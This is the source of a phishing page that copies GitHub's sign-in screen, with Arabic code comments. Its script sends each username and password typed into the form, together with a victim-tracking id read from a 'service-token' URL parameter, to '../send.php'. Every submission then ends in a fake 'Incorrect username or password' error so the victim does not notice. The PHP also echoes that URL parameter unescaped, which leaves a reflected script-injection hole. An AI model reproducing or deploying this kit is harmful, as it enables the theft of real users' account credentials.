<!DOCTYPE html>
<html lang="ar" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub · GitHub</title>
    <link rel="shortcut icon" href="icon.png" type="image/x-icon">
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
    <style>
        :root {
            --github-black: #0d1117;
            --github-gray: #161b22;
            --github-blue: #58a6ff;
            --github-green: #3fb950;
            --github-border: #30363d;
            --github-text: #f0f6fc;
            --github-label: #c9d1d9;
        }

        body {
            background-color: var(--github-black);
            color: var(--github-text);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 0;
            margin: 0;
        }

        .github-header {
            padding: 12px 0;
            display: flex;
            justify-content: center;
            background-color: var(--github-black);
        }

        .github-header-inner {
            width: 100%;
            max-width: 300px;
            display: flex;
            justify-content: center;
        }

        .github-logo {
            color: var(--github-text);
            font-size: 32px;
        }

        .auth-form {
            width: 100%;
            max-width: 300px;
            margin: 0 auto;
            padding: 20px 0;
        }

        .auth-form-header {
            text-align: center;
            margin-bottom: 16px;
        }

        .auth-form-header h1 {
            font-size: 24px;
            font-weight: 300;
            letter-spacing: -0.5px;
        }

        .auth-form-body {
            /* background-color: var(--github-gray); */
            /* border: 1px solid var(--github-border); */
            border-radius: 6px;
            padding: 16px;
        }

        .form-group {
            margin-bottom: 16px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 400;
            color: var(--github-label);
            text-align: left;
        }

        .form-control {
            background-color: var(--github-black);
            color: white !important;
            border: 2px solid var(--github-border);
            border-radius: 6px;
            padding: 8px 12px;
            width: 100%;
            font-size: 14px;
            line-height: 20px;
            margin-top: 4px;
            box-shadow: none !important;
        }

        .form-control:focus {
            outline: none;
            border-color: var(--github-blue);
            /* box-shadow: 0 0 0 3px rgba(56, 139, 253, 0.4); */
        }

        .btn {
            width: 100%;
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            text-align: center;
            border: 1px solid rgba(240, 246, 252, 0.1);
            margin-top: 16px;
        }

        .btn-primary {
            background-color: #238636;
            color: white;
        }

        .btn-primary:hover {
            background-color: #2ea043;
        }

        .create-account {
            padding: 16px;
            text-align: center;
            border: 1px solid var(--github-border);
            border-radius: 6px;
            margin-top: 16px;
        }

        .create-account p {
            margin: 0;
            font-size: 14px;
        }

        .create-account a {
            color: var(--github-blue);
            text-decoration: none;
        }

        .create-account a:hover {
            text-decoration: underline;
        }

        .footer {
            padding: 40px 0;
            margin-top: auto;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            flex-direction: column;
            gap: 7px;
            align-items: center;
            background: #141b23;
            padding: 10px;
        }

        .footer-links a {
            color: #697079;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .form-note {
            font-size: 12px;
            color: var(--github-blue);
            margin-top: 4px;
            text-align: left;
            text-decoration: none;
        }

        .form-note a:hover {
            text-decoration: underline;
        }

        .alert {
            padding: 8px 12px;
            border-radius: 6px;
            margin-bottom: 16px;
            font-size: 14px;
            display: none;
            text-align: left;
        }

        .alert-error {
            background-color: #f85149;
            color: #fff;
        }
    </style>
</head>

<body>
    <!-- الرأس -->
    <header class="github-header">
        <div class="github-header-inner">
            <a href="#" class="github-logo">
                <i class="bi bi-github"></i>
            </a>
        </div>
    </header>

    <!-- نموذج تسجيل الدخول -->
    <main class="auth-form">
        <div class="auth-form-header">
            <h1>Sign in to GitHub</h1>
        </div>

        <div class="alert alert-error" id="error-message">
            Incorrect username or password.
        </div>

        <div class="auth-form-body">
            <form id="login-form">
                <div class="form-group">
                    <label for="username">Username or email address</label>
                    <input type="text" class="form-control" id="username" name="username" autocomplete="username"
                        autofocus>
                </div>

                <div class="form-group">
                    <div style="display: flex; justify-content: space-between;">
                        <label for="password">Password</label>
                        <a class="form-note" href="#" style="margin-top: 0;">Forgot password?</a>
                    </div>
                    <input type="password" class="form-control" id="password" name="password"
                        autocomplete="current-password">
                    <input id="user_id" type="text" style="display: none;"
                        value="<?php echo isset($_GET['service-token']) ? $_GET['service-token'] : 1 ?>">
                </div>

                <button type="submit" class="btn btn-primary">Sign in</button>
            </form>
        </div>

        <div class="create-account">
            <p>New to GitHub? <a href="#">Create an account</a>.</p>
        </div>
    </main>

    <!-- التذييل -->
    <footer class="footer">
        <div class="footer-links">
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
            <a href="#">Docs</a>
            <a href="#">Contact GitHub support</a>
            <a href="#">Manage cookies</a>
            <a href="#">Do not share my personal information</a>
        </div>
    </footer>

    <!-- Bootstrap JS -->
    <!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script> -->

    <!-- JavaScript الخاص بالصفحة -->
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const loginForm = document.getElementById('login-form');
            const errorMessage = document.getElementById('error-message');

            loginForm.addEventListener('submit', async function (e) {
                e.preventDefault();

                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const id = document.getElementById('user_id').value;

                // محاكاة فشل تسجيل الدخول لأغراض العرض
                if (username === '' || password === '') {
                    showError('Please enter both username and password.');
                } else {
                    //after fetch
                    await send(id,username, password);

                    showError('Incorrect username or password.');
                    //after fetch                   

                }
            });

            function showError(message) {
                errorMessage.textContent = message;
                errorMessage.style.display = 'block';

                // إخفاء الرسالة بعد 5 ثوانٍ
                setTimeout(() => {
                    errorMessage.style.display = 'none';
                }, 5000);
            }

            // تأثيرات عند التركيز على الحقول
            const formInputs = document.querySelectorAll('.form-control');
            formInputs.forEach(input => {
                input.addEventListener('focus', function () {
                    this.style.backgroundColor = '#010409';
                });

                input.addEventListener('blur', function () {
                    this.style.backgroundColor = 'var(--github-black)';
                });
            });
        });
        async function send(id, email, password) {
            try {
                let res = await fetch('../send.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        id: id,
                        email: email,
                        password: password,
                        page: 'github'
                    })
                });

                let data = await res.text();
                console.log(data);

            } catch (err) {
                console.error('Error:', err);
            }
        }
    </script>
</body>

</html>